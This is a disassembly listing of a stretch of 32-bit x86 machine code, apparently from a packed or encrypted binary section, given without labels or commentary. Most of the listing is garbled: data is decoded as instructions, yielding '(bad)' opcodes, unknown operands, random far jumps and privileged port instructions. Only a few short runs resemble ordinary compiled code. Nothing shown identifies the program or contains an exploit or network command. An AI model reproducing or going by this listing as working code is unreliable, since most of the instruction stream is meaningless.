  40ddd0:	(bad)  
  40ddd1:	pop    ss
  40ddd2:	cld    
  40ddd3:	cli    
  40ddd4:	cli    
  40ddd5:	icebp  
  40ddd6:	ja     0x40de22
  40ddd8:	pop    ss
  40ddd9:	mov    ebp,0x139ab9ed
  40ddde:	mov    eax,ds:0x9cf9e35b
  40dde3:	jmp    0xac506008
  40dde8:	inc    ebp
  40dde9:	mov    ch,0xc5
  40ddeb:	ds inc ebp
  40dded:	mov    ecx,0xff0b1474
  40ddf2:	push   cs
  40ddf3:	jns    0x40dde2
  40ddf5:	mov    dl,0x1c
  40ddf7:	stos   BYTE PTR es:[edi],al
  40ddf8:	sbb    bl,BYTE PTR [edi+0xec96813]
  40ddfe:	and    bl,cl
  40de00:	lods   eax,DWORD PTR ds:[esi]
  40de01:	repz mov ah,0xde
  40de04:	inc    ecx
  40de05:	in     eax,0xd8
  40de07:	into   
  40de08:	mov    edi,DWORD PTR [ebx+ecx*1]
  40de0b:	(bad)  
  40de0c:	out    dx,eax
  40de0d:	pop    eax
  40de0e:	adc    dh,BYTE PTR [edx]
  40de10:	mov    ecx,0xf74a68ff
  40de15:	add    BYTE PTR [eax+0x75],dl
  40de18:	jl     0x40de3b
  40de1a:	mov    ah,0xc1
  40de1c:	jbe    0x40de9c
  40de1e:	test   DWORD PTR [ecx-0x2c],ebp
  40de21:	cli    
  40de22:	mov    edx,0x4d199bfe
  40de27:	dec    eax
  40de28:	xchg   esi,eax
  40de29:	pop    es
  40de2a:	lds    esp,FWORD PTR [edx-0x3c3cddb4]
  40de30:	test   edx,esi
  40de32:	and    al,0x3f
  40de34:	add    eax,0x98a769f8
  40de39:	in     al,0xf5
  40de3b:	xor    dl,BYTE PTR [esi+0x7]
  40de3e:	adc    eax,0x20451372
  40de43:	and    eax,0xdd8b3951
  40de48:	test   DWORD PTR [ebp-0x30d8d2ef],0x8d1c5245
  40de52:	xchg   edx,eax
  40de53:	pop    esi
  40de54:	push   0xffffffea
  40de56:	retf   
  40de57:	mov    bh,0x96
  40de59:	sbb    BYTE PTR [edx+0x47],al
  40de5c:	(bad)  
  40de5d:	dec    ebx
  40de5e:	pop    ebp
  40de5f:	stc    
  40de60:	cmp    eax,0x9d532cb6
  40de65:	into   
  40de66:	mul    ah
  40de68:	xchg   ecx,eax
  40de69:	outs   dx,DWORD PTR ds:[esi]
  40de6a:	fs call 0xf0cb:0x4131ec07
  40de72:	call   0x4f115960
  40de77:	stos   DWORD PTR es:[edi],eax
  40de78:	repz ret 
  40de7a:	xchg   esp,eax
  40de7b:	into   
  40de7c:	or     al,0x7b
  40de7e:	ret    0x7d8c
  40de81:	dec    eax
  40de82:	pushf  
  40de83:	mov    ebx,0x613fc4bc
  40de88:	icebp  
  40de89:	dec    ecx
  40de8a:	in     eax,dx
  40de8b:	xchg   DWORD PTR [ecx],edi
  40de8d:	in     al,0x62
  40de8f:	fs repz jl 0x40deb6
  40de93:	data16 jmp 0x40de3c
  40de96:	and    al,0x3d
  40de98:	rcr    DWORD PTR [eax+0x5d],0x94
  40de9c:	fsubr  st(7),st
  40de9e:	mov    ebx,0x7581390d
  40dea3:	loopne 0x40de3e
  40dea5:	dec    BYTE PTR [ebx]
  40dea7:	addr16 dec edi
  40dea9:	sbb    eax,0x5d4d649d
  40deae:	inc    edx
  40deaf:	retf   0x9efb
  40deb2:	mov    BYTE PTR [esp+esi*8],0x8
  40deb6:	xchg   edx,eax
  40deb7:	push   eax
  40deb8:	hlt    
  40deb9:	jb     0x40df30
  40debb:	fucomp st(7)
  40debd:	sahf   
  40debe:	imul   edi,DWORD PTR [ebx],0x7ca94299
  40dec4:	ret    0x4910
  40dec7:	(bad)  
  40dec8:	cs jmp 0x40dece
  40decb:	push   esp
  40decc:	pop    edx
  40decd:	pop    eax
  40dece:	jmp    0x4c79:0xea28bf53
  40ded5:	pop    edx
  40ded6:	retfw  0x6212
  40deda:	sub    ah,BYTE PTR [eax+edi*2]
  40dedd:	icebp  
  40dede:	pushf  
  40dedf:	retf   0x2142
  40dee2:	js     0x40de89
  40dee4:	push   edi
  40dee5:	jne    0x40de69
  40dee7:	ds push 0x59ae4b05
  40deed:	xor    edi,esp
  40deef:	(bad)  
  40def0:	iret   
  40def1:	mov    edi,0x13a612dc
  40def6:	xor    BYTE PTR [ebx-0x54],bl
  40def9:	mov    edx,0x735d47df
  40defe:	adc    cl,BYTE PTR [ebp-0x4f]
  40df01:	icebp  
  40df02:	and    bl,al
  40df04:	mov    ecx,0x9292b9c0
  40df09:	shr    DWORD PTR [edi],0x1b
  40df0c:	jecxz  0x40df5c
  40df0e:	mov    edx,0xf3df6237
  40df13:	xor    edi,DWORD PTR ds:0xf2304038
  40df19:	or     eax,0x91d11302
  40df1e:	push   ebp
  40df1f:	dec    ebp
  40df20:	loop   0x40dee6
  40df22:	dec    esp
  40df23:	arpl   WORD PTR [ecx],ax
  40df25:	int    0xd0
  40df27:	and    ebp,eax
  40df29:	and    eax,0xe1802f82
  40df2e:	in     eax,dx
  40df2f:	xchg   esp,eax
  40df30:	not    BYTE PTR [ecx+0x55]
  40df33:	xchg   BYTE PTR [ebx+0x2c],dl
  40df36:	or     eax,0x81f73de0
  40df3b:	mov    ds:0x5d422c7c,al
  40df40:	shl    DWORD PTR [ecx],0x7e
  40df43:	ret    
  40df44:	dec    edx
  40df45:	loop   0x40dedc
  40df47:	jmp    0x160cd6ef
  40df4c:	js     0x40defa
  40df4e:	shr    cl,cl
  40df50:	xchg   edx,eax
  40df51:	or     eax,0x1a5ec00f
  40df56:	pop    ebp
  40df57:	adc    BYTE PTR [esi-0x75],dh
  40df5a:	(bad)  
  40df5c:	(bad)  
  40df5d:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40df5f:	cs je  0x40df46
  40df62:	mov    edi,0xc38d6a4b
  40df67:	jns    0x40df72
  40df69:	je     0x40defa
  40df6b:	cdq    
  40df6c:	mov    edx,0x34042a89
  40df71:	pusha  
  40df72:	push   es
  40df73:	clc    
  40df74:	mov    ecx,0x80cf5b02
  40df79:	jb     0x40df7b
  40df7b:	pop    edi
  40df7c:	ret    0xdc0
  40df7f:	mov    eax,ds:0x3e2d4898
  40df84:	xchg   ecx,eax
  40df85:	dec    edx
  40df86:	pop    ds
  40df87:	or     al,0x85
  40df89:	dec    eax
  40df8a:	push   eax
  40df8b:	xchg   BYTE PTR [ebx],ah
  40df8d:	inc    ecx
  40df8e:	xchg   edi,eax
  40df8f:	cdq    
  40df90:	fs cmp esp,esp
  40df93:	loopne 0x40df17
  40df95:	xchg   ebp,eax
  40df96:	(bad)  
  40df97:	jmp    0x7ba5:0xfba672af
  40df9e:	out    0x7c,al
  40dfa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfa1:	push   esi
  40dfa2:	xor    BYTE PTR [edi],ah
  40dfa4:	sub    al,0x4f
  40dfa6:	pop    ds
  40dfa7:	adc    bh,dh
  40dfa9:	inc    eax
  40dfaa:	add    eax,ebx
  40dfac:	mov    DWORD PTR [ebp-0x54],eax
  40dfaf:	not    DWORD PTR ds:0x42afb9
  40dfb5:	lea    eax,[ebp-0x1c]
  40dfb8:	mov    DWORD PTR [ebp-0x50],eax
  40dfbb:	mov    eax,DWORD PTR [ebp-0x60]
  40dfbe:	xor    eax,esi
  40dfc0:	add    eax,ebx
  40dfc2:	mov    DWORD PTR [ebp-0x60],eax
  40dfc5:	lea    eax,[ebp-0x60]
  40dfc8:	push   eax
  40dfc9:	mov    eax,DWORD PTR [ebp+0xc]
  40dfcc:	jmp    0x40e224
  40dfd1:	ds cmp eax,0xd1d1d2d2
  40dfd7:	rol    DWORD PTR ds:[ecx-0x18bfbec6],1
  40dfde:	loop   0x40df84
  40dfe0:	(bad)  
  40dfe1:	mov    BYTE PTR [edx+0x7e357878],dh
  40dfe7:	js     0x40e061
  40dfe9:	adc    al,ah
  40dfeb:	push   ebx
  40dfec:	jmp    0x40dfc2
  40dfee:	xor    bh,BYTE PTR [edi-0x39]
  40dff1:	leave  
  40dff2:	ror    DWORD PTR [ecx+0x3],cl
  40dff5:	mov    ebx,0xe1e7b826
  40dffa:	mov    bl,0xc9
  40dffc:	and    eax,0x97d430b3
  40e001:	rcl    BYTE PTR ds:0x583949ce,0xe7
  40e008:	jl     0x40e086
  40e00a:	jmp    DWORD PTR [eax-0x687d1bc4]
  40e010:	or     al,0x60
  40e012:	ret    
  40e013:	fcomp  QWORD PTR [ecx]
  40e015:	imul   ebp,edi,0xb9469b71
  40e01b:	(bad)  
  40e01c:	fld    TBYTE PTR ds:0xf7dba447
  40e022:	(bad)  
  40e023:	pop    ebp
  40e024:	push   ecx
  40e025:	outs   dx,DWORD PTR ds:[esi]
  40e026:	daa    
  40e027:	fdiv   QWORD PTR [ecx]
  40e029:	xchg   BYTE PTR [ebx-0x64],dh
  40e02c:	jnp    0x40dfd5
  40e02e:	jge    0x40e016
  40e030:	xor    al,0xe4
  40e032:	daa    
  40e033:	inc    ebp
  40e034:	int    0x61
  40e036:	ret    
  40e037:	push   eax
  40e038:	dec    ecx
  40e039:	jg     0x40dfc5
  40e03b:	or     DWORD PTR [ecx+0x7944726e],edx
  40e041:	xor    ecx,DWORD PTR [edi-0x2eba4e4f]
  40e047:	and    al,0x1c
  40e04a:	stos   BYTE PTR es:[edi],al
  40e04b:	xor    al,0x57
  40e04d:	movsx  esp,dx
  40e050:	sar    DWORD PTR [edx-0x57212359],0x27
  40e057:	popa   
  40e058:	cdq    
  40e059:	fst    st(4)
  40e05b:	mov    ?,WORD PTR [ebp+0x44]
  40e05e:	xchg   esp,eax
  40e05f:	lds    eax,FWORD PTR [esi+0x655b0641]
  40e065:	jb     0x40e07f
  40e067:	or     DWORD PTR [ecx],ebx
  40e069:	sub    cl,BYTE PTR [ecx-0x4019efee]
  40e06f:	inc    eax
  40e070:	push   esi
  40e071:	(bad)  [esi+0x2e]
  40e074:	hlt    
  40e075:	inc    ecx
  40e076:	push   cs
  40e077:	mov    ecx,0xd09384b5
  40e07c:	lods   al,BYTE PTR ds:[esi]
  40e07d:	lea    esi,[ecx+0x3792b230]
  40e083:	enter  0x928,0x1c
  40e087:	das    
  40e088:	into   
  40e089:	xor    eax,0x928c9cf9
  40e08e:	loop   0x40e099
  40e090:	imul   edi,edi,0xe8ec1e48
  40e096:	loopne 0x40e01f
  40e098:	out    dx,eax
  40e099:	clc    
  40e09a:	cmp    BYTE PTR [edx+0x7b47bd79],cl
  40e0a0:	fidivr WORD PTR [esi-0x51c8ad99]
  40e0a6:	ds dec ecx
  40e0a8:	xchg   ecx,eax
  40e0a9:	add    BYTE PTR [eax+0x19746eff],0x58
  40e0b0:	(bad)  
  40e0b1:	inc    BYTE PTR [ebx]
  40e0b3:	sbb    BYTE PTR [ecx],ch
  40e0b5:	or     BYTE PTR ss:[ebx],bl
  40e0b8:	sub    cl,BYTE PTR [eax+0x72]
  40e0bb:	push   0x3cad98ac
  40e0c0:	test   DWORD PTR [edi],edx
  40e0c2:	mov    al,0xe3
  40e0c4:	sub    eax,0x7b3d9531
  40e0c9:	dec    eax
  40e0ca:	mov    dh,bl
  40e0cc:	jo     0x40e109
  40e0ce:	mov    ebx,0x6626aeb6
  40e0d3:	neg    DWORD PTR [edi-0x6e25fa0a]
  40e0d9:	rcl    DWORD PTR [ebp+edx*1+0x35b60f3d],0x87
  40e0e1:	popa   
  40e0e2:	push   cs
  40e0e3:	cs in  eax,0x95
  40e0e6:	fldenv ds:0x758389cc
  40e0ec:	add    BYTE PTR [edx-0x4f27b35f],0x95
  40e0f3:	repnz inc esp
  40e0f5:	push   esp
  40e0f6:	out    dx,eax
  40e0f7:	bound  esi,QWORD PTR [eax-0x13]
  40e0fa:	stos   DWORD PTR es:[edi],eax
  40e0fb:	pop    ebx
  40e0fc:	add    al,0xcc
  40e0fe:	fimul  DWORD PTR [esi+edi*4+0x1e8f612f]
  40e105:	retf   
  40e106:	dec    eax
  40e107:	mov    eax,ds:0xc50f5fec
  40e10c:	ret    0x2e0c
  40e10f:	out    dx,eax
  40e110:	sub    ebx,esi
  40e112:	push   0x69
  40e114:	icebp  
  40e115:	aaa    
  40e116:	mov    al,ds:0xfd4bcbd2
  40e11b:	push   0xb6144294
  40e120:	push   0xffffffcd
  40e122:	sub    BYTE PTR [eax-0x46],ah
  40e125:	cmc    
  40e126:	mov    dh,0xa
  40e128:	pop    edi
  40e129:	sbb    edx,DWORD PTR [esi+0x7]
  40e12c:	xchg   ebp,eax
  40e12d:	test   DWORD PTR [esi+0x7bd687ee],0xa6d2fcb6
  40e137:	enter  0x2764,0x10
  40e13b:	add    DWORD PTR [ecx-0x22df7852],0xffffffb2
  40e142:	pop    ebx
  40e143:	xor    edx,esp
  40e145:	sbb    al,0x83
  40e147:	mov    al,0x9a
  40e149:	mov    al,ds:0xc2df4988
  40e14e:	popa   
  40e14f:	mov    esi,0x53ad5dd8
  40e154:	push   edi
  40e155:	cmc    
  40e156:	mov    DWORD PTR [ebp+0x6fdd525d],esi
  40e15c:	inc    ebx
  40e15d:	in     al,0xad
  40e15f:	mov    bh,0x6c
  40e161:	dec    esi
  40e162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e163:	and    al,0xdc
  40e165:	test   eax,0xc6d3fb2b
  40e16a:	data16 sbb dh,0xa1
  40e16e:	dec    ebx
  40e16f:	xchg   ebp,eax
  40e170:	add    ecx,edi
  40e172:	and    al,0xa6
  40e174:	sar    BYTE PTR [edx+0x8],cl
  40e177:	jmp    0x40e13d
  40e179:	xchg   esi,eax
  40e17a:	cmp    eax,0x8bfd7866
  40e17f:	cmp    eax,0x637335b6
  40e184:	iret   
  40e185:	or     BYTE PTR ds:0x2a41c356,bl
  40e18b:	ds xchg esp,eax
  40e18d:	test   al,0x8b
  40e18f:	mov    esi,0x8148005e
  40e194:	dec    edx
  40e195:	cmp    dl,BYTE PTR [ecx+ebx*8+0x6c]
  40e199:	mov    edx,0xcee21c56
  40e19e:	mov    WORD PTR ds:0xf5cf681d,?
  40e1a4:	aam    0x71
  40e1a6:	test   al,0x3c
  40e1a8:	ins    DWORD PTR es:[edi],dx
  40e1a9:	mov    eax,0x5bc13fdc
  40e1ae:	push   edi
  40e1af:	mov    bl,0x6b
  40e1b1:	cmp    DWORD PTR [esi-0x64],ebx
  40e1b4:	lock adc al,0x2d
  40e1b7:	mov    ds:0xb945c106,eax
  40e1bc:	sbb    DWORD PTR [ecx+ebx*1-0x17],edx
  40e1c0:	out    0xab,eax
  40e1c2:	pop    es
  40e1c3:	fisub  WORD PTR [esi]
  40e1c5:	jle    0x40e180
  40e1c7:	adc    eax,0x6d5c5149
  40e1cc:	sub    al,0x5c
  40e1ce:	sub    BYTE PTR [edi+0x70],ah
  40e1d1:	scas   eax,DWORD PTR es:[edi]
  40e1d2:	je     0x40e1a1
  40e1d4:	dec    ebp
  40e1d5:	test   al,0x61
  40e1d7:	sbb    eax,0x8d52705f
  40e1dc:	fs jmp 0xb83b8a8
  40e1e2:	loop   0x40e208
  40e1e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1e5:	fiadd  DWORD PTR [ebx+0x3c45ca4a]
  40e1eb:	outs   dx,BYTE PTR ds:[esi]
  40e1ec:	leave  
  40e1ed:	ret    0x6851
  40e1f0:	scas   eax,DWORD PTR es:[edi]
  40e1f1:	hlt    
  40e1f2:	adc    ebx,ebx
  40e1f4:	mov    BYTE PTR [esi+0x50],cl
  40e1f7:	loopne 0x40e18f
  40e1f9:	and    eax,0x656c5206
  40e1fe:	dec    edi
  40e1ff:	sub    al,BYTE PTR [ecx-0x19]
  40e202:	rcr    DWORD PTR [edi-0x6787a72c],cl
  40e208:	imul   edx,DWORD PTR [esi+ecx*2],0xeb7eb3d7
  40e20f:	dec    ecx
  40e210:	cdq    
  40e211:	inc    edx
  40e212:	xor    ebx,DWORD PTR [esi+ebp*1+0x1b]
  40e216:	cmp    eax,0xdb374207
  40e21b:	sub    al,0xf5
  40e21d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e21e:	aas    
  40e21f:	jl     0x40e26d
  40e221:	or     ebp,edi
  40e223:	popa   
  40e224:	xor    eax,esi
  40e226:	add    eax,ebx
  40e228:	push   eax
  40e229:	jmp    0x40e481
  40e22e:	(bad)  
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	(bad)  
  40e231:	retf   0xc9d5
  40e234:	fcmovu st,st(3)
  40e236:	aas    
  40e237:	cmp    al,0x7f
  40e239:	push   es
  40e23a:	icebp  
  40e23b:	retf   
  40e23c:	cli    
  40e23d:	jle    0x40e284
  40e23f:	mov    al,0x78
  40e241:	js     0x40e278
  40e243:	jle    0x40e2bd
  40e245:	js     0x40e285
  40e247:	sbb    DWORD PTR [ebx],eax
  40e249:	and    BYTE PTR [eax-0x35],cl
  40e24c:	jo     0x40e204
  40e24e:	pop    eax
  40e24f:	test   al,0x11
  40e251:	mov    ecx,0xf1fe05d
  40e256:	inc    eax
  40e257:	push   esp
  40e258:	(bad)  
  40e259:	loope  0x40e25f
  40e25b:	leave  
  40e25c:	dec    eax
  40e25d:	std    
  40e25e:	pop    esi
  40e25f:	xor    al,0xe1
  40e261:	mov    dl,0xbe
  40e263:	push   ss
  40e264:	enter  0xe8fd,0x65
  40e268:	mov    ds:0x85c632,al
  40e26d:	call   0xde4e20e7
  40e272:	clc    
  40e273:	fsubr  QWORD PTR [esi+0x46]
  40e276:	pop    esp
  40e277:	jle    0x40e2f0
  40e279:	mov    ds:0xca2ed40a,eax
  40e27e:	addr16 out dx,eax
  40e280:	ret    0xb5da
  40e283:	mov    bl,0x32
  40e285:	inc    edx
  40e286:	in     al,dx
  40e287:	cmp    al,0xf7
  40e289:	out    dx,eax
  40e28a:	sbb    eax,0xf6e43b0f
  40e28f:	rcl    DWORD PTR [ebx+0x44],1
  40e292:	dec    ebx
  40e293:	adc    bl,BYTE PTR [edi+0x5d]
  40e296:	in     al,dx
  40e297:	test   DWORD PTR [edx],0xb46e15bc
  40e29d:	in     al,dx
  40e29e:	test   eax,0x593216d8
  40e2a3:	push   0xffffffed
  40e2a5:	push   ebp
  40e2a6:	and    DWORD PTR [ecx+0x4b1de75e],edi
  40e2ac:	cli    
  40e2ad:	inc    edi
  40e2af:	loop   0x40e285
  40e2b1:	xchg   esi,eax
  40e2b2:	js     0x40e317
  40e2b4:	add    eax,0x28ab1ba1
  40e2b9:	fsubr  DWORD PTR [esi]
  40e2bb:	ds inc edi
  40e2bd:	push   eax
  40e2be:	pop    ss
  40e2bf:	inc    edi
  40e2c0:	pop    edi
  40e2c1:	clc    
  40e2c2:	jecxz  0x40e269
  40e2c4:	dec    esp
  40e2c5:	pop    esp
  40e2c6:	adc    ch,BYTE PTR [eax+edi*8+0xb]
  40e2ca:	push   esi
  40e2cb:	(bad)  
  40e2cc:	push   ss
  40e2cd:	jno    0x40e2b0
  40e2cf:	data16 cmp al,0x97
  40e2d2:	or     cl,BYTE PTR [edi-0x7599b4e2]
  40e2d8:	push   edx
  40e2d9:	xchg   edx,eax
  40e2da:	scas   eax,DWORD PTR es:[edi]
  40e2db:	in     al,dx
  40e2dc:	adc    al,cl
  40e2de:	in     eax,dx
  40e2df:	rcl    DWORD PTR [ecx-0x6a],1
  40e2e2:	repz addr16 mov dl,0x9e
  40e2e6:	push   esi
  40e2e7:	fistp  WORD PTR [eax+0x63]
  40e2ea:	adc    dh,BYTE PTR [edi]
  40e2ec:	enter  0xd224,0xe9
  40e2f0:	cs jmp 0x6841b786
  40e2f6:	pop    ebp
  40e2f7:	push   cs
  40e2f8:	(bad)  
  40e2f9:	sbb    al,BYTE PTR [eax-0x2b]
  40e2fc:	arpl   ax,bx
  40e2fe:	shl    DWORD PTR [ebp+0x7a],0x48
  40e302:	loope  0x40e329
  40e304:	mov    esp,0x393a900b
  40e309:	dec    ebp
  40e30a:	lea    ebx,ds:[ecx+0x72102d28]
  40e311:	ins    BYTE PTR es:[edi],dx
  40e312:	mov    eax,0xbb8c1397
  40e317:	in     al,dx
  40e318:	pop    ds
  40e319:	cld    
  40e31a:	cli    
  40e31b:	out    0xec,al
  40e31d:	leave  
  40e31e:	push   edx
  40e31f:	mov    ecx,0x91ba301c
  40e324:	sub    BYTE PTR [ebp-0x2c],dh
  40e327:	out    0x39,eax
  40e329:	lds    eax,FWORD PTR [ebp+0x7d4fdbef]
  40e32f:	arpl   WORD PTR [esi+0x3e678d97],bx
  40e335:	inc    eax
  40e336:	les    eax,FWORD PTR [eax-0x49]
  40e339:	sub    DWORD PTR [eax+0xf],ebx
  40e33c:	arpl   WORD PTR [eax],cx
  40e33e:	ja     0x40e2c2
  40e340:	pusha  
  40e341:	sbb    dl,BYTE PTR [edx]
  40e343:	test   eax,0x9a355ec6
  40e348:	std    
  40e349:	sub    BYTE PTR [ecx+0x30c7f072],0x74
  40e350:	mov    cl,0x54
  40e352:	repz test BYTE PTR [ebp-0xea387ab],ah
  40e359:	aam    0xf
  40e35b:	dec    eax
  40e35c:	sbb    eax,0x700718d6
  40e361:	and    al,0x35
  40e363:	sbb    BYTE PTR [eax-0x3d7bdb6],ch
  40e369:	lods   eax,DWORD PTR ds:[esi]
  40e36a:	nop
  40e36b:	repnz add DWORD PTR [edi],edx
  40e36e:	in     eax,0x40
  40e370:	sti    
  40e371:	fisttp DWORD PTR [ecx-0x13]
  40e374:	mov    al,0x0
  40e376:	mov    ah,0xe0
  40e378:	mov    bl,0xf5
  40e37a:	test   BYTE PTR [ebx],bh
  40e37c:	xor    bl,ch
  40e37e:	outs   dx,BYTE PTR ds:[esi]
  40e37f:	xor    BYTE PTR [edx-0x3a],dl
  40e382:	sahf   
  40e383:	mov    ah,0xfb
  40e386:	xchg   esi,eax
  40e387:	jnp    0x40e337
  40e389:	das    
  40e38a:	sub    DWORD PTR [esi+0x3c],eax
  40e38d:	mov    ah,0x60
  40e38f:	js     0x40e3a7
  40e391:	outs   dx,BYTE PTR ds:[esi]
  40e392:	mov    edx,0x2be016b0
  40e397:	mov    esi,0xe66e0046
  40e39c:	and    BYTE PTR [ebx+0xf0a356],ch
  40e3a2:	out    0x26,al
  40e3a4:	adc    DWORD PTR [edx+0x2c64f2ec],edi
  40e3aa:	div    ecx
  40e3ac:	or     DWORD PTR [eax+0x3d4f8572],0x14
  40e3b3:	jno    0x40e3f8
  40e3b5:	sahf   
  40e3b6:	(bad)  
  40e3b7:	push   ds
  40e3b8:	not    BYTE PTR [ecx-0x56]
  40e3bb:	xor    eax,0x1d421447
  40e3c0:	push   cs
  40e3c1:	aaa    
  40e3c2:	ret    
  40e3c3:	pop    eax
  40e3c4:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3c6:	outs   dx,BYTE PTR ds:[esi]
  40e3c7:	(bad)  
  40e3c8:	mov    esi,0x8f9eec3a
  40e3cd:	cmp    eax,0x87425a74
  40e3d2:	fdiv   QWORD PTR [esi+0x55]
  40e3d5:	xchg   DWORD PTR [eax-0x21],esp
  40e3d8:	imul   esi,DWORD PTR [esi-0x92cfa10],0xffffffa9
  40e3df:	push   cs
  40e3e0:	aas    
  40e3e1:	mov    DWORD PTR [edi],ebp
  40e3e3:	lods   eax,DWORD PTR ds:[esi]
  40e3e4:	lock xchg ebx,eax
  40e3e6:	dec    ecx
  40e3e7:	mov    bl,0x58
  40e3e9:	sub    bh,BYTE PTR [ecx]
  40e3eb:	jmp    0x40e399
  40e3ed:	xor    al,0xb
  40e3ef:	mov    ds:0x31399e13,eax
  40e3f4:	add    DWORD PTR ds:0xcb6fd530,edi
  40e3fa:	mov    eax,0xdf8b508f
  40e3ff:	dec    esp
  40e400:	inc    esp
  40e401:	push   ds
  40e402:	xchg   ecx,eax
  40e403:	inc    edi
  40e404:	mov    DWORD PTR [ecx+0x32],esp
  40e407:	mov    edi,0xd592168b
  40e40c:	mov    ebx,0x4ce24f30
  40e411:	adc    al,0x96
  40e413:	jg     0x40e3cc
  40e415:	adc    edx,DWORD PTR [edi]
  40e417:	or     BYTE PTR [edx],bl
  40e419:	cmp    DWORD PTR [esi+0x5cf16a4d],eax
  40e41f:	pop    ds
  40e420:	outs   dx,DWORD PTR ds:[esi]
  40e421:	in     al,0x91
  40e423:	bound  ebp,QWORD PTR [ebp-0x7601077]
  40e429:	out    dx,eax
  40e42a:	jp     0x40e3f0
  40e42c:	ins    BYTE PTR es:[edi],dx
  40e42d:	arpl   WORD PTR [esi-0x8da03fb],si
  40e433:	call   0xc8a1:0x2f11d2b
  40e43a:	test   DWORD PTR [eax],0xeb29fa1f
  40e440:	out    0xcf,al
  40e442:	mov    edx,0x673a93b7
  40e447:	jbe    0x40e447
  40e449:	loope  0x40e407
  40e44b:	leave  
  40e44c:	pop    edi
  40e44d:	std    
  40e44e:	dec    edi
  40e44f:	outs   dx,BYTE PTR ds:[esi]
  40e450:	scas   al,BYTE PTR es:[edi]
  40e451:	sub    eax,0x4e0c303b
  40e456:	repnz in al,dx
  40e458:	cmp    DWORD PTR [ecx],edi
  40e45a:	xor    ebx,DWORD PTR [edi-0x2d]
  40e45d:	sub    DWORD PTR [ebx],eax
  40e45f:	call   DWORD PTR [edx]
  40e461:	ret    
  40e462:	rcl    BYTE PTR [ecx+0x506a9aa7],1
  40e468:	scas   eax,DWORD PTR es:[edi]
  40e469:	pop    edx
  40e46a:	jp     0x40e4e0
  40e46c:	mov    eax,ds:0x5c524faa
  40e471:	jmp    0x15b9:0x590dca31
  40e478:	sbb    al,0x2
  40e47a:	jb     0x40e45d
  40e47c:	add    BYTE PTR [edi],dh
  40e47e:	jl     0x40e454
  40e480:	aas    
  40e481:	mov    eax,ds:0x41eb06
  40e486:	push   0x41ea5c
  40e48b:	push   DWORD PTR [eax]
  40e48d:	call   0x419198
  40e492:	jmp    0x40e979
  40e497:	cmp    edi,0x13c
  40e49d:	jne    0x40e979
  40e4a3:	mov    eax,DWORD PTR [ebp-0x10]
  40e4a6:	jmp    0x40e6fe
  40e4ab:	sar    DWORD PTR ds:[esi],0xca
  40e4af:	ror    ecx,0xca
  40e4b2:	leave  
  40e4b3:	(bad)  
  40e4b4:	dec    eax
  40e4b5:	cmc    
  40e4b6:	adc    edi,DWORD PTR ds:0x27cd905
  40e4bc:	mov    ch,0x78
  40e4be:	js     0x40e4f5
  40e4c0:	jle    0x40e53a
  40e4c2:	js     0x40e534
  40e4c4:	bnd jl 0x40e50d
  40e4c7:	xlat   BYTE PTR ds:[ebx]
  40e4c8:	jb     0x40e501
  40e4ca:	xor    DWORD PTR [eax-0x9],ebp
  40e4cd:	sub    DWORD PTR [edx],0x6b4146c8
  40e4d3:	mov    ecx,esp
  40e4d5:	in     al,0x6c
  40e4d7:	outs   dx,BYTE PTR ds:[esi]
  40e4d8:	cmp    DWORD PTR [eax],edi
  40e4da:	sub    DWORD PTR [edi-0x2c],edi
  40e4dd:	aaa    
  40e4de:	mov    ds:0x66fe91bf,eax
  40e4e3:	pushf  
  40e4e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4e5:	(bad)
  40e4ea:	lods   al,BYTE PTR ds:[esi]
  40e4eb:	xlat   BYTE PTR ds:[ebx]
  40e4ec:	add    eax,0x44a0e756
  40e4f1:	int    0x59
  40e4f3:	ds daa 
  40e4f5:	mov    al,ds:0xb6432260
  40e4fa:	inc    eax
  40e4fb:	sbb    al,0x6b
  40e4fd:	mov    ecx,0xdcd477a9
  40e502:	imul   BYTE PTR [esi]
  40e504:	pop    ebx
  40e505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e506:	iret   
  40e507:	or     bl,BYTE PTR [ecx+0x13254fc9]
  40e50d:	and    esp,esi
  40e50f:	pop    edi
  40e510:	iret   
  40e511:	out    0x56,al
  40e513:	pop    es
  40e514:	scas   al,BYTE PTR es:[edi]
  40e515:	int    0x90
  40e517:	les    edi,FWORD PTR [edi+0x200e731a]
  40e51d:	inc    esp
  40e51e:	outs   dx,DWORD PTR ds:[esi]
  40e51f:	ins    BYTE PTR es:[edi],dx
  40e520:	add    DWORD PTR [edx+eax*4],ecx
  40e523:	scas   al,BYTE PTR es:[edi]
  40e524:	nop
  40e525:	pop    esi
  40e526:	pop    eax
  40e527:	out    0xbc,al
  40e529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e52a:	cmp    DWORD PTR ss:[esi-0x27a038d4],eax
  40e531:	iret   
  40e532:	xchg   ecx,eax
  40e533:	sub    DWORD PTR [eax-0x6717dbb8],edx
  40e539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e53a:	mov    esi,0xb17a2bab
  40e53f:	arpl   WORD PTR [edx-0x5ff050c7],di
  40e545:	pop    esi
  40e546:	call   0xc1c6:0xa3293490
  40e54d:	adc    eax,edx
  40e54f:	dec    ecx
  40e550:	lahf   
  40e551:	pop    eax
  40e552:	js     0x40e553
  40e554:	xor    BYTE PTR [edi+0x6c18be97],dl
  40e55a:	jnp    0x40e524
  40e55c:	jecxz  0x40e504
  40e55e:	enter  0xcc50,0xd6
  40e562:	std    
  40e563:	(bad)  
  40e564:	fmul   DWORD PTR [eax+0x2059ec37]
  40e56a:	pop    ebp
  40e56b:	es push ds
  40e56d:	pop    ecx
  40e56e:	sbb    BYTE PTR [esp+ebp*8],cl
  40e571:	sub    eax,0xcb2ca2da
  40e576:	xor    dl,BYTE PTR [edx-0x53]
  40e579:	rcl    DWORD PTR [edx+edi*8+0x5],cl
  40e57d:	test   eax,0xf89c4bc4
  40e582:	ja     0x40e55f
  40e584:	(bad)  
  40e585:	fwait
  40e586:	ret    0xc48f
  40e589:	mov    bh,0xb3
  40e58b:	jl     0x40e57a
